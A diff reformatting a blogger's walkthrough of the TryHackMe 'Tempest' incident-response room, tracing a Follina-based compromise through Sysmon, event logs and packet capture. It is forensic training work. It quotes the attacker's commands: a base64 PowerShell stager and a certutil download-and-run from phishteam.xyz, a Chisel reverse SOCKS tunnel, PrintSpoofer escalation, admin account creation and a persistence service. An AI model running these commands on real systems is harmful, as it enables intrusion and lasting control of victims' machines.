@@ -1,17 +1,51 @@
-# Tempest
+<div align="center">
 
-- **Room:** [Tempest](https://tryhackme.com/room/tempestincident)
-- **Path:** SOC Level 1 > SOC Level 1 Capstone Challenges
-- **Difficulty:** Medium
-- **Date completed:** 28th of September 2026
+# 🌩️ Tempest
 
-## Summary
+**TryHackMe - SOC Level 1 Capstone Challenge**
 
-Tempest is an incident response room. A Windows workstation (`TEMPEST`) went through a full attack chain, and the job is to rebuild what happened using three artefacts: Sysmon logs, Windows Event Logs and a packet capture.
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
+![Category](https://img.shields.io/badge/Category-Incident%20Response-blue)
+![Completed](https://img.shields.io/badge/Completed-28th%20of%20September%202026-green)
 
-The short version of the story: user `benimaru` downloaded a malicious Word document, which abused the Follina vulnerability (CVE-2022-30190) to run PowerShell. That dropped a persistence file into the Startup folder, which pulled down a C2 implant. The attacker used it to look around the machine, found a password, tunnelled into WinRM with Chisel, escalated to SYSTEM with PrintSpoofer, created new admin accounts and installed a service for persistent access.
+[![Open Room on TryHackMe](https://img.shields.io/badge/Open%20Room-TryHackMe-212C42?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com/room/tempestincident)
 
-Tools used: EvtxECmd, Timeline Explorer, Brim, CyberChef, VirusTotal and PowerShell.
+</div>
+
+<br>
+
+<h2 align="center">📋 Summary</h2>
+
+Tempest is an incident response room. A Windows workstation (`TEMPEST`) went through a full attack chain, and the job is to rebuild what happened using three artefacts: **Sysmon logs**, **Windows Event Logs** and a **packet capture**.
+
+> **The short version:** user `benimaru` downloaded a malicious Word document, which abused the Follina vulnerability (CVE-2022-30190) to run PowerShell. That dropped a persistence file into the Startup folder, which pulled down a C2 implant. The attacker used it to look around the machine, found a password, tunnelled into WinRM with Chisel, escalated to SYSTEM with PrintSpoofer, created new admin accounts and installed a service for persistent access.
+
+**Attack chain at a glance:**
+
+```
+Malicious .doc → Follina (msdt.exe) → Startup persistence → first.exe (C2)
+→ Recon → Chisel + WinRM → PrintSpoofer → final.exe as SYSTEM → New admins + service
+```
+
+**Tools used:** EvtxECmd · Timeline Explorer · Brim · CyberChef · VirusTotal · PowerShell
+
+<br>
+
+## 🗂️ Contents
+
+- [Task 3 - Preparation](#task-3---preparation-tools-and-artifacts)
+- [Task 4 - Malicious Document](#task-4---initial-access-malicious-document)
+- [Task 5 - Stage 2 Execution](#task-5---initial-access-stage-2-execution)
+- [Task 6 - Malicious Document Traffic](#task-6---initial-access-malicious-document-traffic)
+- [Task 7 - Internal Reconnaissance](#task-7---discovery-internal-reconnaissance)
+- [Task 8 - Privilege Escalation](#task-8---privilege-escalation-exploiting-privileges)
+- [Task 9 - Fully-Owned Machine](#task-9---actions-on-objective-fully-owned-machine)
+- [Attack Timeline](#attack-timeline)
+- [Lessons Learned](#lessons-learned)
+
+<br>
+
+<br>
 
 ---
 
@@ -31,19 +65,38 @@ Get-FileHash -Algorithm SHA256 .\capture.pcapng
 
 Small side note: my first attempt went wrong because I tried to chain commands on one line incorrectly. A semicolon splits separate commands, so it only works between whole commands, not in the middle of one.
 
-`CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`
+**✅ Answer:**
+```
+CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6
+```
+
+<br>
+
+---
 
 ### Q2. What is the SHA256 hash of the sysmon.evtx file?
 
 Same command, just pointing at `sysmon.evtx`.
 
-`665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`
+**✅ Answer:**
+```
+665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F
+```
+
+<br>
+
+---
 
 ### Q3. What is the SHA256 hash of the windows.evtx file?
 
 Same again, with `windows.evtx`.
 
-`D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`
+**✅ Answer:**
+```
+D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60
+```
+
+<br>
 
 ---
 
@@ -63,33 +116,64 @@ This also took a couple of tries. I first got errors because of a misplaced semi
 
 Then I loaded `sysmon.csv` into Timeline Explorer and searched for `.doc`. The same file name was highlighted in the `Payload Data4` column in every result, and to confirm, it was opened by `WINWORD.EXE`.
 
-`free_magicules.doc`
+**✅ Answer:**
+```
+free_magicules.doc
+```
+
+<br>
+
+---
 
 ### Q2. What is the name of the compromised user and machine?
 
-Format: username-machine name
+> 📝 Format: username-machine name
 
 Scrolling all the way left in the same records, the `User Name` column shows `TEMPEST\benimaru` - so the user is `benimaru` and the machine is `TEMPEST`. I just had to flip it into the required format.
 
-`benimaru-TEMPEST`
+**✅ Answer:**
+```
+benimaru-TEMPEST
+```
+
+<br>
+
+---
 
 ### Q3. What is the PID of the Microsoft Word process that opened the malicious document?
 
 The `Payload Data1` column of the Word record shows `ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700`.
 
-`496`
+**✅ Answer:**
+```
+496
+```
+
+<br>
+
+---
 
 ### Q4. Based on Sysmon logs, what is the IPv4 address resolved by the malicious domain used in the previous question?
 
 I searched for `496` to narrow things down to Word's activity, then filtered the `Map Description` column to DNS events (Sysmon Event ID 22). In the full payload of that event I found the domain `phishteam.xyz` and the IP it resolved to.
 
-`167.71.199.191`
+**✅ Answer:**
+```
+167.71.199.191
+```
+
+<br>
+
+---
 
 ### Q5. What is the base64 encoded string in the malicious payload executed by the document?
 
 I quickly googled how base64 usually shows up in PowerShell commands, and the common pattern is `FromBase64String(`. Searching for that in Timeline Explorer gave exactly one record. I opened it and copied the string from inside the command line.
 
-`JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`
+**✅ Answer:**
+```
+JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==
+```
 
 Decoded, it looks like this:
 
@@ -101,7 +185,7 @@ In plain words: go to the user's Startup folder, download `update.zip` from the 
 
 ### Q6. What is the CVE number of the exploit used by the attacker to achieve a remote code execution?
 
-Format: XXXX-XXXXX
+> 📝 Format: XXXX-XXXXX
 
 The record from Q5 had an MD5 hash, so I checked it in VirusTotal - it came back as Microsoft's `msdt.exe`. In the same record I spotted a strange command line:
 
@@ -113,7 +197,12 @@ I pasted that into Google and it came straight back as **Follina**.
 
 Follina in short: a Word document can load an HTML page from a remote server. That page uses the `ms-msdt:` link to open the Microsoft Support Diagnostic Tool (MSDT), and the parameters passed to MSDT can smuggle in PowerShell that gets executed. No macros needed - just opening (or even previewing) the file is enough. The telltale sign in logs is Word spawning `msdt.exe`, exactly like here.
 
-`2022-30190`
+**✅ Answer:**
+```
+2022-30190
+```
+
+<br>
 
 ---
 
@@ -129,15 +218,25 @@ I combined two things: the room's hint that something happens in autostart, and 
 
 Put together:
 
-`C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
+**✅ Answer:**
+```
+C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+```
+
+<br>
+
+---
 
 ### Q2. The implanted payload executes once the user logs into the machine. What is the executed command upon a successful login of the compromised user?
 
-Format: Remove the double quotes from the log.
+> 📝 Format: Remove the double quotes from the log.
 
 I filtered to Event ID 1 (Process Creation) and searched for `phishteam.xyz`, since the startup file most likely talks to the attacker's server again. Two records lit up, both with the same `Payload Data6`, which held the full command. After removing the double quotes:
 
-`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
+**✅ Answer:**
+```
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
+```
 
 So on login, a hidden PowerShell window uses `certutil` (a built-in Windows tool) to download `first.exe` and then runs it.
 
@@ -145,17 +244,29 @@ So on login, a hidden PowerShell window uses `certutil` (a built-in Windows tool
 
 I searched for `first.exe` and focused on the record after the command from Q2, where `first.exe` was already sitting in `C:\Users\Public\Downloads` and being executed. The SHA256 was in the full payload, in one of the last columns.
 
-`CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`
+**✅ Answer:**
+```
+CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8
+```
+
+<br>
+
+---
 
 ### Q4. The stage 2 payload downloaded establishes a connection to a C2 server. What is the domain and port used by the attacker?
 
-Format: domain:port
+> 📝 Format: domain:port
 
 I struggled a bit here and had to do some digging. What worked in the end was filtering to Event ID 3 and searching for `first.exe`.
 
-Why this works: Sysmon Event ID 3 logs every network connection together with the process that made it (the `Image` field). Since I already knew stage 2 was `first.exe`, filtering to only its connections showed where it was calling home - the destination hostname and port. The same address and port kept repeating over and over, which is typical of beaconing to a C2 server.
+Sysmon Event ID 3 logs every network connection together with the process that made it. Since I already knew stage 2 was `first.exe`, filtering to only its connections showed where it was calling home - the destination hostname and port. The same address and port kept repeating over and over, which is typical of beaconing to a C2 server.
 
-`resolvecyber.xyz:80`
+**✅ Answer:**
+```
+resolvecyber.xyz:80
+```
+
+<br>
 
 ---
 
@@ -177,7 +288,14 @@ _path=="http" "phishteam.xyz"
 
 The earliest request is the page the document fetched right after being opened - before `update.zip` and `first.exe`.
 
-`http://phishteam.xyz/02dcf07/index.html`
+**✅ Answer:**
+```
+http://phishteam.xyz/02dcf07/index.html
+```
+
+<br>
+
+---
 
 ### Q2. What is the encoding used by the attacker on the C2 connection?
 
@@ -185,27 +303,55 @@ Same query, but with the C2 domain `resolvecyber.xyz` instead. The URIs were ful
 
 One mistake I made: I pasted the whole URI into CyberChef, including `/9ab62b5?q=`. Those characters are valid base64 too, so they got decoded along with the data and the output turned into garbage. Only the part after `q=` should go in.
 
-`base64`
+**✅ Answer:**
+```
+base64
+```
+
+<br>
+
+---
 
 ### Q3. The malicious C2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
 
 Every request had `?q=` in it, and the value after `q=` decodes into readable command output - the results sent from the victim back to the attacker.
 
-`q`
+**✅ Answer:**
+```
+q
+```
+
+<br>
+
+---
 
 ### Q4. The malicious C2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
 
 Looking at the same list of URIs, the implant keeps requesting the same path to ask for new commands.
 
-`/9ab62b5`
+**✅ Answer:**
+```
+/9ab62b5
+```
+
+<br>
+
+---
 
 ### Q5. What is the HTTP method used by the binary?
 
-`GET`
+**✅ Answer:**
+```
+GET
+```
+
+<br>
+
+---
 
 ### Q6. Based on the user agent, what programming language was used by the attacker to compile the binary?
 
-Format: Answer in lowercase
+> 📝 Format: Answer in lowercase
 
 I added the `user_agent` column to the query:
 
@@ -217,7 +363,12 @@ _path=="http" "resolvecyber.xyz"
 
 Every result showed `Nim httpclient/1.6.6`, so the implant was written in Nim.
 
-`nim`
+**✅ Answer:**
+```
+nim
+```
+
+<br>
 
 ---
 
@@ -243,21 +394,38 @@ The plan was to decode every `q=` value, but copying text out of the VM was a ni
 
 The output of the attacker reading a file on the machine contained the password.
 
-`infernotempest`
+**✅ Answer:**
+```
+infernotempest
+```
+
+<br>
+
+---
 
 ### Q2. The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
 
 The decoded output had a list of listening ports. I googled the ones I didn't recognise, and 5985 is the default port for WinRM (Windows Remote Management) over HTTP - which gives a remote PowerShell shell.
 
-`5985`
+**✅ Answer:**
+```
+5985
+```
+
+<br>
+
+---
 
 ### Q3. The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
 
-Format: Remove the double quotes from the log.
+> 📝 Format: Remove the double quotes from the log.
 
 I remembered seeing something like this in Timeline Explorer earlier, so I searched for `socks` and got exactly one record. After removing the double quotes:
 
-`C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
+**✅ Answer:**
+```
+C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+```
 
 `R:socks` means a reverse SOCKS proxy - the victim connects out to the attacker, and the attacker can then route traffic back through it into the machine's internal services (like WinRM on 5985).
 
@@ -265,23 +433,42 @@ I remembered seeing something like this in Timeline Explorer earlier, so I searc
 
 From Q3 I knew the file was `ch.exe`. The hashes were in the `Payload Data3` column of the same record.
 
-`8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
+**✅ Answer:**
+```
+8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+```
+
+<br>
+
+---
 
 ### Q5. What is the name of the tool used by the attacker based on the SHA256 hash?
 
-Provide the answer in lowercase.
+> 📝 Format: Provide the answer in lowercase.
 
 I pasted the hash into VirusTotal and it came back as `chisel.exe`. Chisel is an open source tunnelling tool, often used by attackers to reach services that aren't exposed to the internet.
 
-`chisel`
+**✅ Answer:**
+```
+chisel
+```
+
+<br>
+
+---
 
 ### Q6. The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
 
-Format: Answer in lowercase
+> 📝 Format: Answer in lowercase
 
 The process that showed up right after Chisel was `wsmprovhost.exe`. That's the host process Windows starts whenever someone opens a remote PowerShell session over WinRM. It all ties together: the attacker tunnelled through Chisel to reach port 5985 (Q2) and logged in with the password found in Q1.
 
-`winrm`
+**✅ Answer:**
+```
+winrm
+```
+
+<br>
 
 ---
 
@@ -289,7 +476,7 @@ The process that showed up right after Chisel was `wsmprovhost.exe`. That's the 
 
 ### Q1. After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
 
-Format: binary name,SHA256 hash
+> 📝 Format: binary name,SHA256 hash
 
 I probably took a slightly harder route here, but I filtered Sysmon to Event ID 1 and sorted from newest to oldest. Luckily the binary was right on the first line - `spf.exe`.
 
@@ -301,15 +488,29 @@ C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe
 
 So `spf.exe` was used to run `final.exe`. The process creation record for that command contained the hash of `spf.exe`.
 
-`spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
+**✅ Answer:**
+```
+spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
+```
+
+<br>
+
+---
 
 ### Q2. Based on the SHA256 hash of the binary, what is the name of the tool used?
 
-Format: Answer in lowercase
+> 📝 Format: Answer in lowercase
 
 VirusTotal > paste the hash > Details.
 
-`printspoofer`
+**✅ Answer:**
+```
+printspoofer
+```
+
+<br>
+
+---
 
 ### Q3. The tool exploits a specific privilege owned by the user. What is the name of the privilege?
 
@@ -317,19 +518,38 @@ I googled what privilege PrintSpoofer abuses.
 
 `SeImpersonatePrivilege` lets an account act as ("impersonate") another user after that user connects to it. It's normal for service accounts, which is why it's so often abused. PrintSpoofer tricks the Print Spooler service, which runs as SYSTEM, into connecting to a named pipe the attacker controls. The tool then grabs SYSTEM's token and uses it to start a new process as SYSTEM.
 
-`SeImpersonatePrivilege`
+**✅ Answer:**
+```
+SeImpersonatePrivilege
+```
+
+<br>
+
+---
 
 ### Q4. Then, the attacker executed the tool with another binary to establish a C2 connection. What is the name of the binary?
 
 This was already visible in Q1. The `-c` flag tells PrintSpoofer which program to run with SYSTEM privileges - here `C:\ProgramData\final.exe`, a new C2 implant. The DNS logs back this up: `final.exe` queried `resolvecyber.xyz` while running as `NT AUTHORITY\SYSTEM`.
 
-`final.exe`
+**✅ Answer:**
+```
+final.exe
+```
+
+<br>
+
+---
 
 ### Q5. The binary connects to a different port from the first C2 connection. What is the port used?
 
 In Timeline Explorer I filtered to network connections (Event ID 3) for `final.exe`, and the full payload showed the destination port.
 
-`8080`
+**✅ Answer:**
+```
+8080
+```
+
+<br>
 
 ---
 
@@ -337,45 +557,85 @@ In Timeline Explorer I filtered to network connections (Event ID 3) for `final.e
 
 ### Q1. Upon achieving SYSTEM access, the attacker then created two users. What are the account names?
 
-Format: Answer in alphabetical order - comma delimited
+> 📝 Format: Answer in alphabetical order - comma delimited
 
 To refresh my memory I googled the command for creating users on Windows - it's `net user <name> <password> /add`. I searched for `/add` in Timeline Explorer and found two new accounts.
 
-`shion,shuna`
+**✅ Answer:**
+```
+shion,shuna
+```
+
+<br>
+
+---
 
 ### Q2. Prior to the successful creation of the accounts, the attacker executed commands that failed in the creation attempt. What is the missing option that made the attempt fail?
 
 I removed `/add` from the search and looked at the other `net user` commands. The earlier attempts didn't have `/add` at all. Without it, `net user <name> <password>` tries to change the password of an existing account - and since those users didn't exist yet, it failed.
 
-`/add`
+**✅ Answer:**
+```
+/add
+```
+
+<br>
+
+---
 
 ### Q3. Based on Windows event logs, the accounts were successfully created. What is the event ID that indicates the account creation activity?
 
 I remembered this one from previous rooms in the SOC module (googling would be just as fast).
 
-`4720`
+**✅ Answer:**
+```
+4720
+```
+
+<br>
+
+---
 
 ### Q4. The attacker added one of the accounts in the local administrator's group. What is the command used by the attacker?
 
 This was also visible while searching for `/add`, in the `Executable Info` column.
 
-`net localgroup administrators /add shion`
+**✅ Answer:**
+```
+net localgroup administrators /add shion
+```
+
+<br>
+
+---
 
 ### Q5. Based on Windows event logs, the account was successfully added to a sensitive group. What is the event ID that indicates the addition to a sensitive local group?
 
 I googled this one - 4732 is "a member was added to a security-enabled local group".
 
-`4732`
+**✅ Answer:**
+```
+4732
+```
+
+<br>
+
+---
 
 ### Q6. After the account creation, the attacker executed a technique to establish persistent administrative access. What is the command executed by the attacker to achieve this?
 
-Format: Remove the double quotes from the log.
+> 📝 Format: Remove the double quotes from the log.
 
 I filtered to Event ID 1 and went through the `Executable Info` column by hand around the account creation events. One execution stood out: `sc.exe` with `TEMPEST` in the command line. After removing the double quotes:
 
-`C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
+**✅ Answer:**
+```
+C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto
+```
 
 This creates a Windows service called `TempestUpdate2` that runs `final.exe` automatically at every boot. Services run as SYSTEM by default, so the attacker keeps full admin-level C2 access even after a restart.
+
+<br>
 
 ---
 
@@ -399,13 +659,19 @@ All events happened on the 20th of June 2022 on host `TEMPEST`.
 
 ---
 
-And voilà, there you have it!
+<br>
+
+<div align="center">
+
+### And voilà, there you have it! 🎉
+
+</div>
+
+<br>
 
 ## Lessons Learned
 
 - **Correlation is the whole game.** Sysmon told me *which process* did something, the pcap told me *what was sent*. Neither was enough on its own - the C2 commands only made sense after decoding the network traffic, and the network traffic only made sense once I knew which process made it.
 - **Know your Sysmon Event IDs.** 1 (process creation), 3 (network connection), 11 (file creation) and 22 (DNS query) answered almost every question in this room.
 - **Follow the parent-child chain.** Word spawning `msdt.exe` is a huge red flag, and walking down from there (msdt > PowerShell > certutil > first.exe) laid out the whole attack.
-- **Load the right file into the right tool.** Brim needs the pcap, not the CSV - I lost some time on "No Result Data" before spotting that.
-- **When a tool fights you, work around it.** The VM clipboard kept breaking, so exporting from Brim and cleaning the data in WordPad saved me from copy-pasting dozens of strings one by one.
 - **Base64 has a look.** Long strings of letters and digits, often ending with `=` or `==`, especially in URL parameters - worth throwing into CyberChef straight away. Just make sure you only paste the encoded part.
